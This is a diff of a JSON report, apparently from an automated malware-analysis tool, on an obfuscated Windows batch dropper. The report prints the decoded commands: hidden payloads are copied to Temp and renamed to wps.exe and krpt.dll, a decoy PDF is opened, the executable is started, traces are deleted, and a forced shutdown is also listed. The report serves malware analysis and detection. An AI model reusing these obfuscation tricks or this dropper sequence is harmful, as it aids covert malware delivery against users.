@@ -1,23 +1,96 @@
 {
-    "response": {
-        "supplementary": [],
-        "extracted": [
-            {
-                "name": "7a82056839.bat",
-                "sha256": "7a820568396ce34cc0e161e8600d8f10a5883ae9d45f68430aa1b31a97b87989"
-            },
-            {
-                "name": "bce2efb1b8_deobfuscated.bat",
-                "sha256": "bce2efb1b8eec24eac6a9e40920e7169b4151f78a311faeeab1d29721a583f49"
-            }
-        ]
-    },
-    "result": {
-        "heuristics": [
-            1,
-            3,
-            4
-        ],
-        "tags": {}
-    }
+  "extra": {
+    "drop_file": false,
+    "score": 500,
+    "sections": [
+      {
+        "auto_collapse": false,
+        "body": "[{\"Command [trun.]\": \"%':~-150,1%%':~-70,1%%':~-84,1%%':~61,1%%':~-136,1%%':~4,1%%':~79,1%%':~-123,1%%':~12,1%%':~31,1%%':\", \"Normalized [trun.]\": \"@set '=^\\\">nul&@if gV'kUx@^\\\"/WL94 QRo^>;C^^pSIywd}Z-P8_`ztO,Y^&ab)ljef=$\\\\~1rnsqXcT6vhm?EAu:+i#*3JK^<]\"}, {\"Command [trun.]\": \"%':~95,1%%':~-156,1%%':~-93,1%%':~44,1%%':~-118,1%%':~-154,1%%':~-14,1%%':~114,1%%':~-146,1%%':~90,1\", \"Normalized [trun.]\": \"@set '=^\\\">nul&@if Eiys'*0lz^\\\"M  Xv^&YAS2moOnK gtHhIQ{#Lk`/+TeG$?x}^<.Bb6cD^>:w@3\\\\9_p4Nrf7^^^|VUCa8Wd\"}, {\"Command [trun.]\": \"%':~-101,1%%':~122,1%%':~143,1%%':~-18,1%%':~-60,1%%':~-139,1%%':~89,1%%':~13,1%%':~-97,1%%':~-99,1%\", \"Normalized [trun.]\": \"@set '=^\\\">nul&@set gxHS=VQXO&@if d9-ApawI^^}T/'y1 Sc{~:WDn`#0r4VCli3@^>^\\\"^|uPk^&6hBmoLOzEM=v^<b_Hq 2\"}, {\"Command [trun.]\": \"%':~9,1%%':~85,1%%':~121,1%%':~-90,1%%':~-158,1%%':~-37,1%%':~109,1%%':~150,1%%':~113,1%%':~-2,1%%':\", \"Normalized [trun.]\": \"@set '=^\\\">nul&@if x pVM@I8ci}:#W2)][(-^|5yQ+aLHkR*3N dE{KYt/ FD^<P6so.C^&zwmTg~lUBX=?^\\\"_v10e'A\\\\SfGqZ\"}, {\"Command [trun.]\": \"%':~113,1%%':~12,1%%':~-93,1%%':~57,1%%':~-66,1%%':~28,1%%':~-28,1%%':~52,1%%':~-110,1%%':~-41,1%%':\", \"Normalized [trun.]\": \"@set '=^\\\">nul&@if $UuZdAMsQ247B\\\\('bv^<Vgri-GyWN.^\\\"^^K+tj`3][e^|S5H86FRPIXwzf 1x*0mTJqD/@kh ^>c~9n {o\"}, {\"Command [trun.]\": \"%':~132,1%%':~-146,1%%':~9,1%%':~-18,1%%':~-113,1%%':~-117,1%%':~-143,1%%':~-83,1%%':~58,1%%':~-63,1\", \"Normalized [trun.]\": \"@set '=^\\\">nul&@set tM=iHkp&@set GilW=jXFus&@set tt=JxAAM&@if k\\\\ ^&PeY7sq=}RX62j^|uz*]xET'C _Z{v.^\\\"o-\"}, {\"Command [trun.]\": \"%':~-87,1%%':~-16,1%%':~20,1%%':~63,1%%':~100,1%%':~-114,1%%':~49,1%%':~11,1%%':~-58,1%%':~25,1%%':~\", \"Normalized [trun.]\": \"@set '=^\\\">nul&@if imXF^<U^^Q GWew9^>BZy^|[}{~Vnf'd=YNp8u4bLt(:K/@x*^&2#PC$\\\\lh R1 ^\\\"6`3Oq.r?0+kgoJIAc\"}, {\"Command [trun.]\": \"%':~-69,1%%':~59,1%%':~-112,1%%':~-119,1%%':~-110,1%%':~7,1%%':~97,1%%':~121,1%%':~134,1%%':~58,1%%'\", \"Normalized [trun.]\": \"@set '=^\\\">nul&@set uwr=XgvlR&@set wgWXs=UK&@set wRt=Ud&@if 3EA'7~BOr-*.w(0ozQgNkmJ{tC28e lZfY^>sKX5S\"}, {\"Command [trun.]\": \"%':~-39,1%%':~9,1%%':~-80,1%%':~-33,1%%':~97,1%%':~-122,1%%':~65,1%%':~16,1%%':~26,1%%':~-25,1%%':~9\", \"Normalized [trun.]\": \"@set '=^\\\">nul&@set LJl=tE&@if ~Kk)Fs{f^|^^u^<[gC^\\\"4m l`M'TirR]wQH+XI_Z}=L5E\\\\:76eVj81*-ncoa qPUyJ93bp\"}, {\"Command [trun.]\": \"%':~20,1%%':~49,1%%':~133,1%%':~-125,1%%':~5,1%%':~39,1%%':~104,1%%':~-37,1%%':~-145,1%%':~110,1%%':\", \"Normalized [trun.]\": \"@set '=^\\\">nul&@if -^| 7_qa\\\\^\\\"uZ@MkC}$dcxBtL'OVyXivsJIQ?j[FR4fg2`1P/9#KEAD3~8n*pzo= +^>^<r{.0H^^WNw()\"}, {\"Command [trun.]\": \"%':~-136,1%%':~-48,1%%':~-16,1%%':~-129,1%%':~40,1%%':~-23,1%%':~40,1%%':~115,1%%':~147,1%%':~-136,1\", \"Normalized [trun.]\": \"@echo on&@endlocal&@cls\"}]",
+        "body_format": "TABLE",
+        "classification": "TLP:W",
+        "depth": 0,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 1,
+          "score": 50,
+          "score_map": {},
+          "signatures": {}
+        },
+        "tags": {},
+        "title_text": "Additional command grouping after command normalization",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": "[{\"Command [trun.]\": \"%commonprogramfiles:~-2,1%%os:~-8,1%%os:~-7,1%%commonprogramfiles:~-16,1%%comspec:~-7,1%%commonprogr\", \"Normalized [trun.]\": \"endlcoal 2>nul\"}, {\"Command [trun.]\": \"%':~-150,1%%':~-70,1%%':~-84,1%%':~61,1%%':~-136,1%%':~4,1%%':~79,1%%':~-123,1%%':~12,1%%':~31,1%%':\", \"Normalized [trun.]\": \"@set '=^\\\">nul&@if gV'kUx@^\\\"/WL94 QRo^>;C^^pSIywd}Z-P8_`ztO,Y^&ab)ljef=$\\\\~1rnsqXcT6vhm?EAu:+i#*3JK^<]\"}, {\"Command [trun.]\": \"%':~95,1%%':~-156,1%%':~-93,1%%':~44,1%%':~-118,1%%':~-154,1%%':~-14,1%%':~114,1%%':~-146,1%%':~90,1\", \"Normalized [trun.]\": \"@set '=^\\\">nul&@if Eiys'*0lz^\\\"M  Xv^&YAS2moOnK gtHhIQ{#Lk`/+TeG$?x}^<.Bb6cD^>:w@3\\\\9_p4Nrf7^^^|VUCa8Wd\"}, {\"Command [trun.]\": \"%':~-101,1%%':~122,1%%':~143,1%%':~-18,1%%':~-60,1%%':~-139,1%%':~89,1%%':~13,1%%':~-97,1%%':~-99,1%\", \"Normalized [trun.]\": \"@set '=^\\\">nul&@set gxHS=VQXO&@if d9-ApawI^^}T/'y1 Sc{~:WDn`#0r4VCli3@^>^\\\"^|uPk^&6hBmoLOzEM=v^<b_Hq 2\"}, {\"Command [trun.]\": \"%':~9,1%%':~85,1%%':~121,1%%':~-90,1%%':~-158,1%%':~-37,1%%':~109,1%%':~150,1%%':~113,1%%':~-2,1%%':\", \"Normalized [trun.]\": \"@set '=^\\\">nul&@if x pVM@I8ci}:#W2)][(-^|5yQ+aLHkR*3N dE{KYt/ FD^<P6so.C^&zwmTg~lUBX=?^\\\"_v10e'A\\\\SfGqZ\"}, {\"Command [trun.]\": \"%':~113,1%%':~12,1%%':~-93,1%%':~57,1%%':~-66,1%%':~28,1%%':~-28,1%%':~52,1%%':~-110,1%%':~-41,1%%':\", \"Normalized [trun.]\": \"@set '=^\\\">nul&@if $UuZdAMsQ247B\\\\('bv^<Vgri-GyWN.^\\\"^^K+tj`3][e^|S5H86FRPIXwzf 1x*0mTJqD/@kh ^>c~9n {o\"}, {\"Command [trun.]\": \"%':~132,1%%':~-146,1%%':~9,1%%':~-18,1%%':~-113,1%%':~-117,1%%':~-143,1%%':~-83,1%%':~58,1%%':~-63,1\", \"Normalized [trun.]\": \"@set '=^\\\">nul&@set tM=iHkp&@set GilW=jXFus&@set tt=JxAAM&@if k\\\\ ^&PeY7sq=}RX62j^|uz*]xET'C _Z{v.^\\\"o-\"}, {\"Command [trun.]\": \"%':~-87,1%%':~-16,1%%':~20,1%%':~63,1%%':~100,1%%':~-114,1%%':~49,1%%':~11,1%%':~-58,1%%':~25,1%%':~\", \"Normalized [trun.]\": \"@set '=^\\\">nul&@if imXF^<U^^Q GWew9^>BZy^|[}{~Vnf'd=YNp8u4bLt(:K/@x*^&2#PC$\\\\lh R1 ^\\\"6`3Oq.r?0+kgoJIAc\"}, {\"Command [trun.]\": \"%':~-69,1%%':~59,1%%':~-112,1%%':~-119,1%%':~-110,1%%':~7,1%%':~97,1%%':~121,1%%':~134,1%%':~58,1%%'\", \"Normalized [trun.]\": \"@set '=^\\\">nul&@set uwr=XgvlR&@set wgWXs=UK&@set wRt=Ud&@if 3EA'7~BOr-*.w(0ozQgNkmJ{tC28e lZfY^>sKX5S\"}, {\"Command [trun.]\": \"%':~-39,1%%':~9,1%%':~-80,1%%':~-33,1%%':~97,1%%':~-122,1%%':~65,1%%':~16,1%%':~26,1%%':~-25,1%%':~9\", \"Normalized [trun.]\": \"@set '=^\\\">nul&@set LJl=tE&@if ~Kk)Fs{f^|^^u^<[gC^\\\"4m l`M'TirR]wQH+XI_Z}=L5E\\\\:76eVj81*-ncoa qPUyJ93bp\"}, {\"Command [trun.]\": \"%':~20,1%%':~49,1%%':~133,1%%':~-125,1%%':~5,1%%':~39,1%%':~104,1%%':~-37,1%%':~-145,1%%':~110,1%%':\", \"Normalized [trun.]\": \"@set '=^\\\">nul&@if -^| 7_qa\\\\^\\\"uZ@MkC}$dcxBtL'OVyXivsJIQ?j[FR4fg2`1P/9#KEAD3~8n*pzo= +^>^<r{.0H^^WNw()\"}, {\"Command [trun.]\": \"%':~-136,1%%':~-48,1%%':~-16,1%%':~-129,1%%':~40,1%%':~-23,1%%':~40,1%%':~115,1%%':~147,1%%':~-136,1\", \"Normalized [trun.]\": \"@echo on&@endlocal&@cls\"}, {\"Command [trun.]\": \"%':~-16,1%%':~-62,1%%':~-10,1%%':~137,1%%':~-28,1%%':~-16,1%%':~-23,1%%':~107,1%%':~144,1%%':~-120,1\", \"Normalized [trun.]\": \"cmd /c xcopy /h /y \\\\__MACOSX\\\\.DOCX\\\\wda.tmp C:\\\\Users\\\\puncher\\\\AppData\\\\Local\\\\Temp\\\\\"}, {\"Command [trun.]\": \"%':~107,1%%':~144,1%%':~-120,1%%':~-51,1%%':~-70,1%%':~137,1%%':~-28,1%%':~31,1%%':~137,1%%':~132,1%\", \"Normalized [trun.]\": \"xcopy /h /y \\\\__MACOSX\\\\.DOCX\\\\mbp.tmp C:\\\\Users\\\\puncher\\\\AppData\\\\Local\\\\Temp\\\\\"}, {\"Command [trun.]\": \"%':~-1,1%%':~-138,1%%':~22,1%%':~-32,1%%':~17,1%%':~-52,1%%':~137,1%%':~-110,1%%':~79,1%%':~-23,1%%'\", \"Normalized [trun.]\": \"attrib -s -a -h C:\\\\Users\\\\puncher\\\\AppData\\\\Local\\\\Temp\\\\wda.tmp\"}, {\"Command [trun.]\": \"%':~-32,1%%':~112,1%%':~115,1%%':~159,1%%':~-62,1%%':~-48,1% %temp%%':~-19,1%%':~-144,1%%':~-10,1%%'\", \"Normalized [trun.]\": \"rename C:\\\\Users\\\\puncher\\\\AppData\\\\Local\\\\Temp\\\\wda.tmp wps.exe\"}, {\"Command [trun.]\": \"%':~-1,1%%':~-138,1%%':~22,1%%':~128,1%%':~17,1%%':~108,1%%':~-23,1%%':~-110,1%%':~79,1%%':~137,1%%'\", \"Normalized [trun.]\": \"attrib -s -a -h C:\\\\Users\\\\puncher\\\\AppData\\\\Local\\\\Temp\\\\mbp.tmp\"}, {\"Command [trun.]\": \"%':~128,1%%':~-48,1%%':~-45,1%%':~-1,1%%':~98,1%%':~-48,1% %temp%%':~-19,1%%':~-62,1%%':~108,1%%':~-\", \"Normalized [trun.]\": \"rename C:\\\\Users\\\\puncher\\\\AppData\\\\Local\\\\Temp\\\\mbp.tmp krpt.dll\"}, {\"Command [trun.]\": \"%':~-1,1%%':~-138,1%%':~-138,1%%':~-32,1%%':~-143,1%%':~108,1%%':~-23,1%%':~-110,1%%':~79,1%%':~-23,\", \"Normalized [trun.]\": \"attrib -s -a -h \\\\__MACOSX\\\\.DOCX\\\\wda.tmp\"}, {\"Command [trun.]\": \"%':~150,1%%':~-48,1%%':~-27,1%%':~-23,1%%':~-130,1%%cd%%':~141,1%%':~-75,1%%':~85,1%%':~48,1%%':~106\", \"Normalized [trun.]\": \"del \\\"\\\\__MACOSX\\\\.DOCX\\\\wda.tmp\\\"\"}, {\"Command [trun.]\": \"%':~159,1%%':~-138,1%%':~-138,1%%':~-32,1%%':~17,1%%':~108,1%%':~-23,1%%':~50,1%%':~-81,1%%':~-23,1%\", \"Normalized [trun.]\": \"attrib -s -a -h \\\\__MACOSX\\\\.DOCX\\\\aaa.bat\"}, {\"Command [trun.]\": \"%':~150,1%%':~-48,1%%':~133,1%%':~-23,1%%':~-35,1%%':~-56,1%%':~-51,1%%':~150,1%%':~-15,1%%':~104,1%\", \"Normalized [trun.]\": \"del *.pdf.lnk\"}, {\"Command [trun.]\": \"%':~144,1%%':~40,1%%':~-51,1%%':~-70,1% %cd%%':~141,1%%':~85,1%%':~-75,1%%':~48,1%%':~106,1%%':~-85,\", \"Normalized [trun.]\": \"copy \\\\__MACOSX\\\\.DOCX\\\\\\u06b4\\u02fb\\u00bc\\u03f8\\u02f5.pdf \\\\\\u06b4\\u02fb\\u00bc\\u03f8\\u02f5.pdf\"}, {\"Command [trun.]\": \"%':~-81,1%%':~22,1%%':~159,1%%':~-32,1%%':~-138,1% %cd%%':~-19,1%\\u06b4\\u02fb\\u00bc\\u03f8\\u02f5%':~-56,1%%':~-51,1%%':~150,1%\", \"Normalized [trun.]\": \"start \\\\\\u06b4\\u02fb\\u00bc\\u03f8\\u02f5.pdf\"}, {\"Command [trun.]\": \"%':~79,1%%':~22,1%%':~-1,1%%':~-32,1%%':~22,1% %temp%%':~-19,1%%':~-144,1%%':~-51,1%%':~79,1%%':~-56\", \"Normalized [trun.]\": \"start C:\\\\Users\\\\puncher\\\\AppData\\\\Local\\\\Temp\\\\wps.exe\"}, {\"Command [trun.]\": \"%':~150,1%%':~-48,1%%':~-27,1%%':~137,1%%':~-28,1%%':~-81,1%%':~-23,1%%':~132,1%%':~28,1%%':~137,1%%\", \"Normalized [trun.]\": \"del /s /q /f script.bat\"}]",
+        "body_format": "TABLE",
+        "classification": "TLP:W",
+        "depth": 0,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 3,
+          "score": 250,
+          "score_map": {},
+          "signatures": {}
+        },
+        "tags": {},
+        "title_text": "Execution of variable content",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": "[{\"Count\": 40, \"Command [trun.]\": \"@%comspec:~11,1%%comspec:~-12,1%%comspec:~14,1%%commonprogramfiles:~10,1%'=%programfiles:~6,1%^^^%pa\", \"Normalized [trun.]\": \"@set '=g^^V^^'k^^Ux^^@^^^\\\"^^/^^W^^L^^9^^4^^ ^^Q^^Ro^^^>^^;^^C^^^^p^^S^^Iywd^^}^^Z^^-^^P^^8^^_^^`zt^^\"}, {\"Count\": 29, \"Command [trun.]\": \"@%os:~6,1%%comspec:~15,1%%comspec:~-13,1%%commonprogramfiles:~13,1%%commonprogramfiles:~18,1%%comspe\", \"Normalized [trun.]\": \"@setlocal enabledelayedexpansion\"}, {\"Count\": 12, \"Command [trun.]\": \"%commonprogramfiles:~-2,1%%os:~-8,1%%os:~-7,1%%commonprogramfiles:~-16,1%%comspec:~-7,1%%commonprogr\", \"Normalized [trun.]\": \"endlcoal 2>nul\"}, {\"Count\": 12, \"Command [trun.]\": \"@%comspec:~13,1%hu%comspec:~14,1%%os:~3,1%%commonprogramfiles:~18,1%%os:~5,1%%os:~2,1%%programfiles:\", \"Normalized [trun.]\": \"@shutdown /s /f /t 0\"}, {\"Count\": 634, \"Command [trun.]\": \"%':~-150,1%%':~-70,1%%':~-84,1%%':~61,1%%':~-136,1%%':~4,1%%':~79,1%%':~-123,1%%':~12,1%%':~31,1%%':\", \"Normalized [trun.]\": \"@set '=^\\\">nul&@if gV'kUx@^\\\"/WL94 QRo^>;C^^pSIywd}Z-P8_`ztO,Y^&ab)ljef=$\\\\~1rnsqXcT6vhm?EAu:+i#*3JK^<]\"}, {\"Count\": 651, \"Command [trun.]\": \"%':~95,1%%':~-156,1%%':~-93,1%%':~44,1%%':~-118,1%%':~-154,1%%':~-14,1%%':~114,1%%':~-146,1%%':~90,1\", \"Normalized [trun.]\": \"@set '=^\\\">nul&@if Eiys'*0lz^\\\"M  Xv^&YAS2moOnK gtHhIQ{#Lk`/+TeG$?x}^<.Bb6cD^>:w@3\\\\9_p4Nrf7^^^|VUCa8Wd\"}, {\"Count\": 627, \"Command [trun.]\": \"%':~-101,1%%':~122,1%%':~143,1%%':~-18,1%%':~-60,1%%':~-139,1%%':~89,1%%':~13,1%%':~-97,1%%':~-99,1%\", \"Normalized [trun.]\": \"@set '=^\\\">nul&@set gxHS=VQXO&@if d9-ApawI^^}T/'y1 Sc{~:WDn`#0r4VCli3@^>^\\\"^|uPk^&6hBmoLOzEM=v^<b_Hq 2\"}, {\"Count\": 731, \"Command [trun.]\": \"%':~9,1%%':~85,1%%':~121,1%%':~-90,1%%':~-158,1%%':~-37,1%%':~109,1%%':~150,1%%':~113,1%%':~-2,1%%':\", \"Normalized [trun.]\": \"@set '=^\\\">nul&@if x pVM@I8ci}:#W2)][(-^|5yQ+aLHkR*3N dE{KYt/ FD^<P6so.C^&zwmTg~lUBX=?^\\\"_v10e'A\\\\SfGqZ\"}, {\"Count\": 630, \"Command [trun.]\": \"%':~113,1%%':~12,1%%':~-93,1%%':~57,1%%':~-66,1%%':~28,1%%':~-28,1%%':~52,1%%':~-110,1%%':~-41,1%%':\", \"Normalized [trun.]\": \"@set '=^\\\">nul&@if $UuZdAMsQ247B\\\\('bv^<Vgri-GyWN.^\\\"^^K+tj`3][e^|S5H86FRPIXwzf 1x*0mTJqD/@kh ^>c~9n {o\"}, {\"Count\": 807, \"Command [trun.]\": \"%':~132,1%%':~-146,1%%':~9,1%%':~-18,1%%':~-113,1%%':~-117,1%%':~-143,1%%':~-83,1%%':~58,1%%':~-63,1\", \"Normalized [trun.]\": \"@set '=^\\\">nul&@set tM=iHkp&@set GilW=jXFus&@set tt=JxAAM&@if k\\\\ ^&PeY7sq=}RX62j^|uz*]xET'C _Z{v.^\\\"o-\"}, {\"Count\": 639, \"Command [trun.]\": \"%':~-87,1%%':~-16,1%%':~20,1%%':~63,1%%':~100,1%%':~-114,1%%':~49,1%%':~11,1%%':~-58,1%%':~25,1%%':~\", \"Normalized [trun.]\": \"@set '=^\\\">nul&@if imXF^<U^^Q GWew9^>BZy^|[}{~Vnf'd=YNp8u4bLt(:K/@x*^&2#PC$\\\\lh R1 ^\\\"6`3Oq.r?0+kgoJIAc\"}, {\"Count\": 597, \"Command [trun.]\": \"%':~-69,1%%':~59,1%%':~-112,1%%':~-119,1%%':~-110,1%%':~7,1%%':~97,1%%':~121,1%%':~134,1%%':~58,1%%'\", \"Normalized [trun.]\": \"@set '=^\\\">nul&@set uwr=XgvlR&@set wgWXs=UK&@set wRt=Ud&@if 3EA'7~BOr-*.w(0ozQgNkmJ{tC28e lZfY^>sKX5S\"}, {\"Count\": 705, \"Command [trun.]\": \"%':~-39,1%%':~9,1%%':~-80,1%%':~-33,1%%':~97,1%%':~-122,1%%':~65,1%%':~16,1%%':~26,1%%':~-25,1%%':~9\", \"Normalized [trun.]\": \"@set '=^\\\">nul&@set LJl=tE&@if ~Kk)Fs{f^|^^u^<[gC^\\\"4m l`M'TirR]wQH+XI_Z}=L5E\\\\:76eVj81*-ncoa qPUyJ93bp\"}, {\"Count\": 552, \"Command [trun.]\": \"%':~20,1%%':~49,1%%':~133,1%%':~-125,1%%':~5,1%%':~39,1%%':~104,1%%':~-37,1%%':~-145,1%%':~110,1%%':\", \"Normalized [trun.]\": \"@set '=^\\\">nul&@if -^| 7_qa\\\\^\\\"uZ@MkC}$dcxBtL'OVyXivsJIQ?j[FR4fg2`1P/9#KEAD3~8n*pzo= +^>^<r{.0H^^WNw()\"}, {\"Count\": 23, \"Command [trun.]\": \"%':~-136,1%%':~-48,1%%':~-16,1%%':~-129,1%%':~40,1%%':~-23,1%%':~40,1%%':~115,1%%':~147,1%%':~-136,1\", \"Normalized [trun.]\": \"@echo on&@endlocal&@cls\"}, {\"Count\": 44, \"Command [trun.]\": \"%':~-16,1%%':~-62,1%%':~-10,1%%':~137,1%%':~-28,1%%':~-16,1%%':~-23,1%%':~107,1%%':~144,1%%':~-120,1\", \"Normalized [trun.]\": \"cmd /c xcopy /h /y \\\\__MACOSX\\\\.DOCX\\\\wda.tmp C:\\\\Users\\\\puncher\\\\AppData\\\\Local\\\\Temp\\\\\"}, {\"Count\": 37, \"Command [trun.]\": \"%':~107,1%%':~144,1%%':~-120,1%%':~-51,1%%':~-70,1%%':~137,1%%':~-28,1%%':~31,1%%':~137,1%%':~132,1%\", \"Normalized [trun.]\": \"xcopy /h /y \\\\__MACOSX\\\\.DOCX\\\\mbp.tmp C:\\\\Users\\\\puncher\\\\AppData\\\\Local\\\\Temp\\\\\"}, {\"Count\": 24, \"Command [trun.]\": \"%':~-1,1%%':~-138,1%%':~22,1%%':~-32,1%%':~17,1%%':~-52,1%%':~137,1%%':~-110,1%%':~79,1%%':~-23,1%%'\", \"Normalized [trun.]\": \"attrib -s -a -h C:\\\\Users\\\\puncher\\\\AppData\\\\Local\\\\Temp\\\\wda.tmp\"}, {\"Count\": 23, \"Command [trun.]\": \"%':~-32,1%%':~112,1%%':~115,1%%':~159,1%%':~-62,1%%':~-48,1% %temp%%':~-19,1%%':~-144,1%%':~-10,1%%'\", \"Normalized [trun.]\": \"rename C:\\\\Users\\\\puncher\\\\AppData\\\\Local\\\\Temp\\\\wda.tmp wps.exe\"}, {\"Count\": 24, \"Command [trun.]\": \"%':~-1,1%%':~-138,1%%':~22,1%%':~128,1%%':~17,1%%':~108,1%%':~-23,1%%':~-110,1%%':~79,1%%':~137,1%%'\", \"Normalized [trun.]\": \"attrib -s -a -h C:\\\\Users\\\\puncher\\\\AppData\\\\Local\\\\Temp\\\\mbp.tmp\"}, {\"Count\": 24, \"Command [trun.]\": \"%':~128,1%%':~-48,1%%':~-45,1%%':~-1,1%%':~98,1%%':~-48,1% %temp%%':~-19,1%%':~-62,1%%':~108,1%%':~-\", \"Normalized [trun.]\": \"rename C:\\\\Users\\\\puncher\\\\AppData\\\\Local\\\\Temp\\\\mbp.tmp krpt.dll\"}, {\"Count\": 39, \"Command [trun.]\": \"%':~-1,1%%':~-138,1%%':~-138,1%%':~-32,1%%':~-143,1%%':~108,1%%':~-23,1%%':~-110,1%%':~79,1%%':~-23,\", \"Normalized [trun.]\": \"attrib -s -a -h \\\\__MACOSX\\\\.DOCX\\\\wda.tmp\"}, {\"Count\": 30, \"Command [trun.]\": \"%':~150,1%%':~-48,1%%':~-27,1%%':~-23,1%%':~-130,1%%cd%%':~141,1%%':~-75,1%%':~85,1%%':~48,1%%':~106\", \"Normalized [trun.]\": \"del \\\"\\\\__MACOSX\\\\.DOCX\\\\wda.tmp\\\"\"}, {\"Count\": 39, \"Command [trun.]\": \"%':~159,1%%':~-138,1%%':~-138,1%%':~-32,1%%':~17,1%%':~108,1%%':~-23,1%%':~50,1%%':~-81,1%%':~-23,1%\", \"Normalized [trun.]\": \"attrib -s -a -h \\\\__MACOSX\\\\.DOCX\\\\aaa.bat\"}, {\"Count\": 13, \"Command [trun.]\": \"%':~150,1%%':~-48,1%%':~133,1%%':~-23,1%%':~-35,1%%':~-56,1%%':~-51,1%%':~150,1%%':~-15,1%%':~104,1%\", \"Normalized [trun.]\": \"del *.pdf.lnk\"}, {\"Count\": 31, \"Command [trun.]\": \"%':~144,1%%':~40,1%%':~-51,1%%':~-70,1% %cd%%':~141,1%%':~85,1%%':~-75,1%%':~48,1%%':~106,1%%':~-85,\", \"Normalized [trun.]\": \"copy \\\\__MACOSX\\\\.DOCX\\\\\\u06b4\\u02fb\\u00bc\\u03f8\\u02f5.pdf \\\\\\u06b4\\u02fb\\u00bc\\u03f8\\u02f5.pdf\"}, {\"Count\": 11, \"Command [trun.]\": \"%':~-81,1%%':~22,1%%':~159,1%%':~-32,1%%':~-138,1% %cd%%':~-19,1%\\u06b4\\u02fb\\u00bc\\u03f8\\u02f5%':~-56,1%%':~-51,1%%':~150,1%\", \"Normalized [trun.]\": \"start \\\\\\u06b4\\u02fb\\u00bc\\u03f8\\u02f5.pdf\"}, {\"Count\": 14, \"Command [trun.]\": \"%':~79,1%%':~22,1%%':~-1,1%%':~-32,1%%':~22,1% %temp%%':~-19,1%%':~-144,1%%':~-51,1%%':~79,1%%':~-56\", \"Normalized [trun.]\": \"start C:\\\\Users\\\\puncher\\\\AppData\\\\Local\\\\Temp\\\\wps.exe\"}, {\"Count\": 12, \"Command [trun.]\": \"%':~150,1%%':~-48,1%%':~-27,1%%':~137,1%%':~-28,1%%':~-81,1%%':~-23,1%%':~132,1%%':~28,1%%':~137,1%%\", \"Normalized [trun.]\": \"del /s /q /f script.bat\"}]",
+        "body_format": "TABLE",
+        "classification": "TLP:W",
+        "depth": 0,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 4,
+          "score": 200,
+          "score_map": {},
+          "signatures": {}
+        },
+        "tags": {},
+        "title_text": "Multiple variable were used on the same line",
+        "zeroize_on_tag_safe": false
+      }
+    ]
+  },
+  "files": {
+    "extracted": [
+      {
+        "name": "7a82056839.bat",
+        "sha256": "7a820568396ce34cc0e161e8600d8f10a5883ae9d45f68430aa1b31a97b87989"
+      },
+      {
+        "name": "bce2efb1b8_deobfuscated.bat",
+        "sha256": "bce2efb1b8eec24eac6a9e40920e7169b4151f78a311faeeab1d29721a583f49"
+      }
+    ],
+    "supplementary": []
+  },
+  "results": {
+    "heuristics": [
+      {
+        "attack_ids": [],
+        "heur_id": 1,
+        "signatures": []
+      },
+      {
+        "attack_ids": [],
+        "heur_id": 3,
+        "signatures": []
+      },
+      {
+        "attack_ids": [],
+        "heur_id": 4,
+        "signatures": []
+      }
+    ],
+    "tags": {},
+    "temp_submission_data": {}
+  }
 }
